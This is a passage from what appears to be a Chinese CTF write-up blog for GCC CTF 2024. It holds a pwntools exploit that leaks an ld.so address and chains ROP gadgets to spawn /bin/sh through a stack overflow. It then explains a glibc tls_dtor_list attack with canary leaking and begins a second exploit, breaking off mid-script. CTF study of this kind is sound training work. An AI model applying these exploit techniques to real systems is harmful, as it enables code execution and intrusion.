	<span class="nb">xor</span> <span class="nv">rax</span><span class="o">,</span> <span class="nv">rax</span> 	<span class="c">; Reset local output</span>
	<span class="nb">mov</span> <span class="nb">al</span><span class="o">,</span> <span class="nv">rsp</span><span class="o">[</span><span class="nv">rcx</span><span class="o">]</span> <span class="c">; Read read char from str</span>

	<span class="c">; IF char == null_byte</span>
	<span class="nb">cmp</span> <span class="nb">al</span><span class="o">,</span> <span class="mi">0</span>
	<span class="nb">je</span> <span class="nv">end_loop_number</span>

	<span class="c">; IF char == new_line</span>
	<span class="nb">cmp</span> <span class="nb">al</span><span class="o">,</span> <span class="mi">10</span>
	<span class="nb">je</span> <span class="nv">end_loop_number</span>

	<span class="c">; IF char &lt; "0"</span>
	<span class="nb">cmp</span> <span class="nb">al</span><span class="o">,</span> <span class="sc">'0'</span>
	<span class="nb">jb</span> <span class="nv">_error_not_int</span>

	<span class="c">; IF char &gt; "9"</span>
	<span class="nb">cmp</span> <span class="nb">al</span><span class="o">,</span> <span class="sc">'9'</span>
	<span class="nb">ja</span> <span class="nv">_error_not_int</span>

	<span class="c">; IF its the units digit, dont multiply by ten before adding</span>
	<span class="nb">test</span> <span class="nv">rcx</span><span class="o">,</span> <span class="nv">rcx</span>
	<span class="nb">je</span> <span class="nv">skip_mul</span>

	<span class="c">; Multiply the result by ten</span>
	<span class="nb">imul</span> <span class="nv">r10</span><span class="o">,</span> <span class="nv">r10</span><span class="o">,</span> <span class="mi">10</span>

<span class="nl">skip_mul</span><span class="err">:</span>
	<span class="c">; Digit ascii value to actual value</span>
	<span class="nb">sub</span> <span class="nv">rax</span><span class="o">,</span> <span class="sc">'0'</span>
	<span class="c">; Add digit to result</span>
	<span class="nb">add</span> <span class="nv">r10</span><span class="o">,</span> <span class="nv">rax</span>

	<span class="c">; Continue looping through the digits until reaching the end</span>
	<span class="nb">inc</span> <span class="nv">rcx</span>
	<span class="nb">cmp</span> <span class="nv">rcx</span><span class="o">,</span> <span class="mi">8</span>
	<span class="nb">jne</span> <span class="nv">loop_over_digits</span>

<span class="nl">end_loop_number</span><span class="err">:</span>
	<span class="c">; Clean 8 bytes buffer</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">8</span>
	<span class="c">; Clean stackframe and return</span>
	<span class="nb">leave</span>
	<span class="nb">ret</span>

<span class="c">; @Type: Function</span>
<span class="c">; @Quick: _main_loop(void)</span>
<span class="c">; @Desc: Perform all the program operations</span>
<span class="nl">_main_loop</span><span class="err">:</span>
	<span class="c">; Setup stack frame</span>
	<span class="nb">push</span> <span class="nv">rbp</span>
	<span class="nb">mov</span> <span class="nv">rbp</span><span class="o">,</span> <span class="nv">rsp</span>

	<span class="c">; Display the length input message</span>
	<span class="nb">lea</span> <span class="nv">rax</span><span class="o">,[</span><span class="nv">rel</span> <span class="nv">len_str_message</span><span class="o">]</span>
	<span class="nb">push</span> <span class="nv">rax</span>
	<span class="nb">push</span> <span class="mi">0</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">16</span>

	<span class="c">; Read length from stdin in decimal</span>
	<span class="nb">call</span> <span class="nv">_get_len_str</span>
	<span class="c">; Add 1 to result because of later calculations</span>
	<span class="nb">add</span> <span class="nv">r10</span><span class="o">,</span> <span class="mi">1</span>

	<span class="c">; Display the string input message</span>
	<span class="nb">lea</span> <span class="nv">rax</span><span class="o">,[</span><span class="nv">rel</span> <span class="nv">inp_str_message</span><span class="o">]</span>
	<span class="nb">push</span> <span class="nv">rax</span>
	<span class="nb">push</span> <span class="mi">0</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">16</span>

	<span class="c">; Read str from stdin and print it</span>
	<span class="nb">push</span> <span class="nv">r10</span>
	<span class="nb">call</span> <span class="nv">_read_and_print_str</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">8</span>

	<span class="c">; Display the delimiter</span>
	<span class="nb">lea</span> <span class="nv">rax</span><span class="o">,[</span><span class="nv">rel</span> <span class="nv">delimiter_message</span><span class="o">]</span>
	<span class="nb">push</span> <span class="nv">rax</span>
	<span class="nb">push</span> <span class="mi">0</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">16</span>

	<span class="nb">leave</span>
	<span class="nb">ret</span>

<span class="c">; //// [Program] ////</span>

<span class="nl">_start</span><span class="err">:</span>
	<span class="c">; Display banner message</span>
	<span class="nb">lea</span> <span class="nv">rax</span><span class="o">,[</span><span class="nv">rel</span> <span class="nv">main_message</span><span class="o">]</span>
	<span class="nb">push</span> <span class="nv">rax</span>
	<span class="nb">push</span> <span class="mi">0</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">16</span>

	<span class="nb">mov</span> <span class="nv">rbp</span><span class="o">,</span> <span class="nv">rsp</span>
<span class="nl">__main_loop</span><span class="err">:</span>
	<span class="nb">call</span> <span class="nv">_main_loop</span>
	<span class="nb">jmp</span> <span class="nv">__main_loop</span>

<span class="c">; //// [Error Handlers] ////</span>

<span class="c">; @Type: ERROR_HANDLER</span>
<span class="c">; @Quick: _error_not_int(void)</span>
<span class="c">; @Raise_condition: When converting str to int, if a character is not a digit.</span>
<span class="nl">_error_not_int</span><span class="err">:</span>
	<span class="c">; PUTS error_msg_not_int</span>
	<span class="nb">lea</span> <span class="nv">rax</span><span class="o">,[</span><span class="nv">rel</span> <span class="nv">error_msg_not_int</span><span class="o">]</span>
	<span class="nb">push</span> <span class="nv">rax</span>
	<span class="nb">push</span> <span class="mi">0</span>
	<span class="nb">call</span> <span class="nv">_PUTS</span>
	<span class="nb">add</span> <span class="nv">rsp</span><span class="o">,</span> <span class="mi">8</span>

	<span class="c">; SYS_EXIT(0)</span>
	<span class="nb">xor</span> <span class="nv">edi</span><span class="o">,</span> <span class="nv">edi</span>
	<span class="nb">mov</span> <span class="nv">rax</span><span class="o">,</span> <span class="mh">0x3c</span>
	<span class="nb">syscall</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

nasm <span class="nt">-f</span> ELF64 <span class="nt">-o</span> chall.o chall.asm
gcc <span class="nt">-z</span> noexecstack <span class="nt">-o</span> chall chall.o <span class="nt">-nostdlib</span>
<span class="nb">rm </span>chall.o

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>没有 引用libc.so, 可以在 stack 泄露 ld.so 的地址 然后从ld.so 上 找 <code class="language-plaintext highlighter-rouge">gadget</code>​ 打 ，然后栈溢出打ROP</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chall</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">

#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(in decimal) &gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2222222</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">the string to cut &gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">ld_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mi">228016</span>
<span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(in decimal) &gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2222222</span><span class="sh">'</span><span class="p">)</span>
<span class="n">rax_rdx_rbx_ret</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x000000000001ee12</span> <span class="c1"># pop rax ; pop rdx ; pop rbx ; ret
</span><span class="n">rsi_ret</span>         <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x000000000000469a</span> <span class="c1"># pop rsi ; ret
</span><span class="n">rdi_ret</span>         <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x0000000000003b63</span> <span class="c1"># pop rdi ; ret
</span><span class="n">syscall</span>         <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x000000000000b708</span> <span class="c1"># syscall
</span><span class="n">pay</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">([</span>
    <span class="n">rax_rdx_rbx_ret</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
    <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stack</span><span class="o">-</span><span class="mi">208</span><span class="p">,</span>
    <span class="n">rsi_ret</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">syscall</span>
    <span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">the string to cut &gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span><span class="o">+</span><span class="mh">0x108</span><span class="o">*</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">+</span> <span class="n">pay</span><span class="p">)</span>
<span class="c1">#gdb.attach(io,gdbscript)
</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="baby_bof"><span class="me-2">Baby_bof</span><a href="#baby_bof" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>高版本 glibc 攻击 <code class="language-plaintext highlighter-rouge">tls_dtor_list</code>​,  <code class="language-plaintext highlighter-rouge">main</code>​ 函数正常 return 退出，或者 执行 <code class="language-plaintext highlighter-rouge">exit();</code>​ 都会触发这个</li>
  <li>正常情况下 <code class="language-plaintext highlighter-rouge">tls_dtor_list</code>​ 是空值.（类似一个hook 函数）</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201139-4p6hw6i.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201139-4p6hw6i.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>程序漏洞，简单解释</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201253-wg683gd.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240307201253-wg683gd.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>可以利用 printf 泄露 地址，然后泄露 <code class="language-plaintext highlighter-rouge">Canary</code>​（需要覆盖部分canary然后泄露它下面的 一个随机值，main return 时候会检测）</li>
  <li>很简单，可以参考 高版本tls_dtor_list的利用。</li>
</ul>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./baby_bof</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x002BCB
b *__call_tls_dtors
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">sp</span><span class="p">(</span><span class="n">pay</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">s_exit</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x68</span>
<span class="nf">sp</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">tls_base</span>    <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">3229322</span> <span class="o">-</span> <span class="mi">198</span>
<span class="n">libc_base</span>   <span class="o">=</span> <span class="n">tls_base</span> <span class="o">+</span> <span class="mi">5248</span>
<span class="n">system</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
